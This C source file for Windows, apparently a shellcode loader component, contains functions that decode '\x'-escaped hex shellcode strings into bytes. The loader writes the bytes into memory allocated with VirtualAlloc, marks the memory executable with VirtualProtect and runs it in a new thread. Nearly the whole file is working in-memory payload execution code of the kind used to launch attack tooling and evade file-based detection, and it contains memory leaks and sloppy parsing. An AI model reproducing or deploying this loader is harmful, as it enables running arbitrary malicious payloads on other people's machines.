#include "baseFunction.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
void trim(char *str) {
	int len;
	len = strlen(str);
	for (int i = 0; i < len; i++) {
		if (str[i] == ' '|| str[i]=='\n') {
			str[i] = '\0';
		}
	}

}
void str_Replace(char *mainStr, char searchChar, char replaceChar) {
	char tmpChar;
	for (int i = 0; i < strlen(mainStr); i++) {
		if (mainStr[i] == searchChar) {
			mainStr[i] = replaceChar;
		}
	}
}
typedef void(*s)();
void ExecuteShellcode(unsigned char *buf, int shellcodeLen) {
	int NUM = shellcodeLen;
	DWORD dwOldProtect = NULL;
	PVOID pCodeSpace = VirtualAlloc(NULL, NUM, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pCodeSpace != NULL) {
		CopyMemory(pCodeSpace, buf, NUM);
		Sleep(200);
		VirtualProtect(pCodeSpace, NUM, PAGE_EXECUTE, &dwOldProtect);
		s coder = (s)pCodeSpace;
		HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)coder, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
	}
	return;
}
char** xCharToNoXChar(char *sourceBuf, int shellcodeLen) {
	char **shellcode;
	const char s[4] = "\\x";
	char *token;
	int k = 0;
	int i = 0;
	shellcode = (char **)malloc(sizeof(char *)*shellcodeLen);
	for (i = 0; i < shellcodeLen; i++) {
		shellcode[i] = (char *)malloc(sizeof(char) * 3);
	}
	token = strtok(sourceBuf, s);
	/* 继续获取其他的子字符串 */
	while (token != NULL) {
		//printf("%s\n", token);
		shellcode[k] = token;
		token = strtok(NULL, s);
		k++;
	}

	return shellcode;
}
int singleHexCharToInt(char singleHexChar) {

	if (singleHexChar <= '9'&&singleHexChar >= '0') {
		return singleHexChar - '0';
	}
	else if (singleHexChar <= 'f'&&singleHexChar >= 'a') {
		return (singleHexChar - 'a') + 10;
	}
	else if (singleHexChar <= 'F'&&singleHexChar >= 'A') {
		return (singleHexChar - 'A') + 10;
	}
}
int hexCharToAscii(const char *buf) {
	int asciiNum = 0;
	int len = 2;     //只处理形如0xfc这种两位的16进制数
	asciiNum = asciiNum + singleHexCharToInt(buf[0]) * 16;
	asciiNum = asciiNum + singleHexCharToInt(buf[1]) * 1;
	return asciiNum;
}

void ExecuteXCharShellcode(char *shellCodeXChar, int shellcodeLen) {
	char **shellCodeNoXChar;
	unsigned char *realShellcode;
	unsigned char chr;


	//puts(shellCodeXChar);
	shellCodeNoXChar = (char **)malloc(sizeof(char *)*shellcodeLen);
	realShellcode = (unsigned char *)malloc(sizeof(unsigned char)*shellcodeLen);
	for (int i = 0; i < shellcodeLen; i++) {
		shellCodeNoXChar[i] = (char *)malloc(sizeof(char) * 3);
		ZeroMemory(shellCodeNoXChar[i], 3);
	}
	shellCodeNoXChar = xCharToNoXChar(shellCodeXChar, shellcodeLen);
	for (int k = 0; k < shellcodeLen; k++) {
		int asciiNum = 0;
		asciiNum = hexCharToAscii(shellCodeNoXChar[k]);
		chr = (unsigned char)asciiNum;
		realShellcode[k] = chr;
		
	}
	
	/*
	for (int k = 0; k < shellcodeLen; k++) {
		printf("%x\n", realShellcode[k]);
	}
	*/
	int NUM = shellcodeLen;
	DWORD dwOldProtect = NULL;
	PVOID pCodeSpace = VirtualAlloc(NULL, NUM, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pCodeSpace != NULL) {
		CopyMemory(pCodeSpace, realShellcode, NUM);
		Sleep(200);
		VirtualProtect(pCodeSpace, NUM, PAGE_EXECUTE, &dwOldProtect);
		s coder = (s)pCodeSpace;
		HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)coder, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
	}
	//ExecuteShellcode(realShellcode, shellcodeLen);
	for (int k = 0; k < shellcodeLen; k++) {
		free(shellCodeNoXChar[k]);
	}
	free(shellCodeNoXChar);
	free(realShellcode);
	
	
}
